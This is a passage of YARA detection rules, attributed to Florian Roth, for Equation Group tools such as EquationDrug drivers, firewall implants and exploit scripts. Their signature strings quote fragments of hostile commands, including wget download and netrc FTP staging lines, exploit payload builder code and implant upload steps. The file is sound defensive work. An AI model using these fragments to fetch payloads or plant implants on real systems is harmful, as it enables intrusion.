$s3 = \"LSASS.EXE\" fullword wide\n        $s4 = \"Windows Configuration Services\" fullword wide\n        $s8 = \"unilay.dll\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_NetworkSniffer5\n{\n    meta:\n        description = \"EquationDrug - Network-sniffer/patcher\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_NetworkSniffer5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s2 = \"atmdkdrv.sys\" fullword wide\n        $s4 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s5 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s6 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_FileSystem_Filter\n{\n    meta:\n        description = \"EquationDrug - Filesystem filter driver\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_FileSystem_Filter\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"volrec.sys\" fullword wide\n        $s1 = \"volrec.pdb\" fullword ascii\n        $s2 = \"Volume recognizer driver\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_keyword\n{\n    meta:\n        description = \"Equation group's keyword in executable file\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_equation_keyword\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"Backsnarf_AB25\" wide\n        $a2 = \"Backsnarf_AB25\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of ($a*)\n}\n\nrule EquationGroup_noclient_3_0_5\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: noclient-3.0.5.3)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_noclient_3_0_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"-C %s 127.0.0.1\\\" scripme -F -t JACKPOPIN4 '&\" fullword ascii\n        $x2 = \"Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo.\" fullword ascii\n        $x3 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n        $x4 = \"Error from ourtn, did not find keys=target in tn.spayed\" fullword ascii\n        $x5 = \"ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 700KB and 1 of them) or (all of them)\n}\n\nrule EquationGroup_installdate\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: installdate.pl)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_installdate\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"#Provide hex or EP log as command-line argument or as input\" fullword ascii\n        $x2 = \"print \\\"Gimme hex: \\\";\" fullword ascii\n        $x3 = \"if ($line =~ /Reg_Dword:  (\\\\d\\\\d:\\\\d\\\\d:\\\\d\\\\d.\\\\d+ \\\\d+ - )?(\\\\S*)/) {\" fullword ascii\n        $s1 = \"if ($_ =~ /InstallDate/) {\" fullword ascii\n        $s2 = \"if (not($cmdInput)) {\" fullword ascii\n        $s3 = \"print \\\"$hex in decimal=$dec\\\\n\\\\n\\\";\" fullword ascii\n\n    condition:\n        filesize < 2KB and (1 of ($x*) or 3 of them)\n}\n\nrule EquationGroup_teflondoor\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: teflondoor.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_teflondoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"%s: abort.  Code is %d.  Message is '%s'\" fullword ascii\n        $x2 = \"%s: %li b (%li%%)\" fullword ascii\n        $s1 = \"no winsock\" fullword ascii\n        $s2 = \"%s: %s file '%s'\" fullword ascii\n        $s3 = \"peer: connect\" fullword ascii\n        $s4 = \"read: write\" fullword ascii\n        $s5 = \"%s: done!\" fullword ascii\n        $s6 = \"%s: %li b\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 1 of ($x*) and 3 of them\n}\n\nrule EquationGroup_durablenapkin_solaris_2_0_1\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: durablenapkin.solaris.2.0.1.1)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_durablenapkin_solaris_2_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"recv_ack: %s: Service not supplied by provider\" fullword ascii\n        $s2 = \"send_request: putmsg \\\"%s\\\": %s\" fullword ascii\n        $s3 = \"port undefined\" fullword ascii\n        $s4 = \"recv_ack: %s getmsg: %s\" fullword ascii\n        $s5 = \">> %d -- %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 40KB and 2 of them)\n}\n\nrule EquationGroup_teflonhandle\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: teflonhandle.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_teflonhandle\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%s [infile] [outfile] /k 0x[%i character hex key] </g>\" fullword ascii\n        $s2 = \"File %s already exists.  Overwrite? (y/n) \" fullword ascii\n        $s3 = \"Random Key : 0x\" fullword ascii\n        $s4 = \"done (%i bytes written).\" fullword ascii\n        $s5 = \"%s --> %s...\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and 2 of them\n}\n\nrule EquationGroup_false\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: false.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_false\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n            00 25 6C 75 2E 25 6C 75 2E 25 6C 75 2E 25 6C 75\n            00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n            00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n            00 25 32 2E 32 58 20 00 00 0A 00 00 00 25 64 20\n            2D 20 25 64 20 25 64 0A 00 25 64 0A 00 25 64 2E\n            0A 00 00 00 00 25 64 2E 0A 00 00 00 00 25 64 2E\n            0A 00 00 00 00 25 64 20 2D 20 25 64 0A 00 00 00\n            00 25 64 20 2D 20 25 64 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and $s1\n}\n\nrule EquationGroup_bc_genpkt\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: bc-genpkt)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_bc_genpkt\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"load auxiliary object=%s requested by file=%s\" fullword ascii\n        $x2 = \"size of new packet, should be %d <= size <= %d bytes\" fullword ascii\n        $x3 = \"verbosity - show lengths, packet dumps, etc\" fullword ascii\n        $s1 = \"%s: error while loading shared libraries: %s%s%s%s%s\" fullword ascii\n        $s2 = \"cannot dynamically load executable\" fullword ascii\n        $s3 = \"binding file %s to %s: %s symbol `%s' [%s]\" fullword ascii\n        $s4 = \"randomize the initiator cookie\" fullword ascii\n\n    condition:\n        uint16(0) == 0x457f and filesize < 1000KB and (1 of ($s*) and 3 of them)\n}\n\nrule EquationGroup_dn_1_0_2_1\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: dn.1.0.2.1.linux)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_dn_1_0_2_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO\" fullword ascii\n        $s2 = \"invalid format suggest DMAC=00:00:00:00:00:00\" fullword ascii\n        $s3 = \"SMAC=%02x:%02x:%02x:%02x:%02x:%02x\" fullword ascii\n        $s4 = \"Not everything is set yet\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and 2 of them)\n}\n\nrule EquationGroup_morel\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: morel.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_morel\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%d - %d, %d\" fullword ascii\n        $s2 = \"%d - %lu.%lu %d.%lu\" fullword ascii\n        $s3 = \"%d - %d %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 60KB and all of them)\n}\n\nrule EquationGroup_bc_parser\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: bc-parser)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_bc_parser\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"*** Target may be susceptible to FALSEMOREL      ***\" fullword ascii\n        $s2 = \"*** Target is susceptible to FALSEMOREL          ***\" fullword ascii\n\n    condition:\n        uint16(0) == 0x457f and 1 of them\n}\n\nrule EquationGroup_1212\n{\n    meta:\n        description = \"Tool from EQGRP toolset (file: 1212.pl)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_1212\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))\" fullword ascii\n        $s2 = \"$ans=\\\"$srcip:$srcport -> $dstip:$dstport\\\";\" fullword ascii\n        $s3 = \"return \\\"ERROR:$line is not a valid port\\\";\" fullword ascii\n        $s4 = \"$dstport=hextoPort($dstport);\" fullword ascii\n        $s5 = \"sub hextoPort\" fullword ascii\n        $s6 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n\n    condition:\n        filesize < 6KB and 4 of them\n}\n\nrule EquationGroup_1212_dehex\n{\n    meta:\n        description = \"Tool from EQGRP toolset  (files: 1212.pl, dehex.pl)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_1212_dehex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"return \\\"ERROR:$line is not a valid address\\\";\" fullword ascii\n        $s2 = \"print \\\"ERROR: the filename or hex representation needs to be one argument try using \\\\\\\"'s\\\\n\\\";\" fullword ascii\n        $s3 = \"push(@octets,$byte_table{$tempi});\" fullword ascii\n        $s4 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n        $s5 = \"print hextoIP($ARGV[0]);\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 6KB and (5 of ($s*))) or (all of them)\n}\n\nrule EquationGroup_install_get_persistent_filenames\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: install_get_persistent_filenames)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"install_get_persistent_filenames\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Generates the persistence file name and prints it out.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and all of them)\n}\n\nrule EquationGroup_create_dns_injection\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: create_dns_injection.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_create_dns_injection\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Name:   A hostname: 'host.network.com', a decimal numeric offset within\" fullword ascii\n        $s2 = \"-a www.badguy.net,CNAME,1800,host.badguy.net \\\\\\\\\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_screamingplow\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: screamingplow.sh)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_screamingplow\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"What is the name of your PBD:\" fullword ascii\n        $s2 = \"You are now ready for a ScreamPlow\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_MixText\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: MixText.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_MixText\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"BinStore enabled implants.\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_tunnel_state_reader\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: tunnel_state_reader)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_tunnel_state_reader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Active connections will be maintained for this tunnel. Timeout:\" fullword ascii\n        $s5 = \"%s: compatible with BLATSTING version 1.2\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_payload\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: payload.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_payload\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"can't find target version module!\" fullword ascii\n        $s2 = \"class Payload:\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_eligiblecandidate\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: eligiblecandidate.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_eligiblecandidate\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $o1 = \"Connection timed out. Only a problem if the callback was not received.\" fullword ascii\n        $o2 = \"Could not reliably detect cookie. Using 'session_id'...\" fullword ascii\n        $c1 = \"def build_exploit_payload(self,cmd=\\\"/tmp/httpd\\\"):\" fullword ascii\n        $c2 = \"self.build_exploit_payload(cmd)\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_BUSURPER_2211_724\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BUSURPER-2211-724.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BUSURPER_2211_724\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".got_loader\" fullword ascii\n        $s2 = \"_start_text\" fullword ascii\n        $s3 = \"IMPLANT\" fullword ascii\n        $s4 = \"KEEPGOING\" fullword ascii\n        $s5 = \"upgrade_implant\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_networkProfiler_orderScans\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: networkProfiler_orderScans.sh)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_networkProfiler_orderScans\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Unable to save off predefinedScans directory\" fullword ascii\n        $x2 = \"Re-orders the networkProfiler scans so they show up in order in the LP\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_epicbanana_2_1_0_1\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: epicbanana_2.1.0.1.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_epicbanana_2_1_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"failed to create version-specific payload\" fullword ascii\n        $s2 = \"(are you sure you did \\\"make [version]\\\" in versions?)\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_sniffer_xml2pcap\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: sniffer_xml2pcap)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_sniffer_xml2pcap\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)\" fullword ascii\n        $x2 = \"convert an XML file generated by the BLATSTING sniffer module into a pcap capture file.\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_BananaAid\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BananaAid)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BananaAid\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"(might have to delete key in ~/.ssh/known_hosts on linux box)\" fullword ascii\n        $x2 = \"scp BGLEE-\" ascii\n        $x3 = \"should be 4bfe94b1 for clean bootloader version 3.0; \" fullword ascii\n        $x4 = \"scp <configured implant> <username>@<IPaddr>:onfig\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_bo\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: bo)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_bo\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ERROR: failed to open %s: %d\" fullword ascii\n        $s2 = \"__libc_start_main@@GLIBC_2.0\" fullword ascii\n        $s3 = \"serial number: %s\" fullword ascii\n        $s4 = \"strerror@@GLIBC_2.0\" fullword ascii\n        $s5 = \"ERROR: mmap failed: %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 20KB and all of them)\n}\n\nrule EquationGroup_SecondDate_2211\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: SecondDate-2211.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_SecondDate_2211\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"SD_processControlPacket\" fullword ascii\n        $s2 = \"Encryption_rc4SetKey\" fullword ascii\n        $s3 = \".got_loader\" fullword ascii\n        $s4 = \"^GET.*(?:/ |\\\\.(?:htm|asp|php)).*\\\\r\\\\n\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_config_jp1_UA\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: config_jp1_UA.pl)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_config_jp1_UA\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"This program will configure a JETPLOW Userarea file.\" fullword ascii\n        $x2 = \"Error running config_implant.\" fullword ascii\n        $x3 = \"NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION \" fullword ascii\n        $x4 = \"First IP address for beacon destination [127.0.0.1]\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_userscript\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: userscript.FW)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_userscript\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! \" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_BBALL_M50FW08_2201\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BBALL_M50FW08-2201.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BBALL_M50FW08_2201\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".got_loader\" fullword ascii\n        $s2 = \"LOADED\" fullword ascii\n        $s3 = \"pageTable.c\" fullword ascii\n        $s4 = \"_start_text\" fullword ascii\n        $s5 = \"handler_readBIOS\" fullword ascii\n        $s6 = \"KEEPGOING\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 40KB and 5 of ($s*))\n}\n\nrule EquationGroup_BUSURPER_3001_724\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: BUSURPER-3001-724.exe)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_BUSURPER_3001_724\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"IMPLANT\" fullword ascii\n        $s2 = \"KEEPGOING\" fullword ascii\n        $s3 = \"upgrade_implant\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 200KB and 2 of them) or (all of them)\n}\n\nrule EquationGroup_workit\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: workit.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_workit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"macdef init > /tmp/.netrc;\" fullword ascii\n        $s2 = \"/usr/bin/wget http://\" fullword ascii\n        $s3 = \"HOME=/tmp ftp\" fullword ascii\n        $s4 = \" >> /tmp/.netrc;\" fullword ascii\n        $s5 = \"/usr/rapidstream/bin/tftp\" fullword ascii\n        $s6 = \"created shell_command:\" fullword ascii\n        $s7 = \"rm -f /tmp/.netrc;\" fullword ascii\n        $s8 = \"echo quit >> /tmp/.netrc;\" fullword ascii\n        $s9 = \"echo binary >> /tmp/.netrc;\" fullword ascii\n        $s10 = \"chmod 600 /tmp/.netrc;\" fullword ascii\n        $s11 = \"created cli_command:\" fullword ascii\n\n    condition:\n        6 of them\n}\n\nrule EquationGroup_tinyhttp_setup\n{\n    meta:\n        description = \"EQGRP Toolset Firewall (file: tinyhttp_setup.sh)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_tinyhttp_setup\"\n        license = \"GPL-2.0 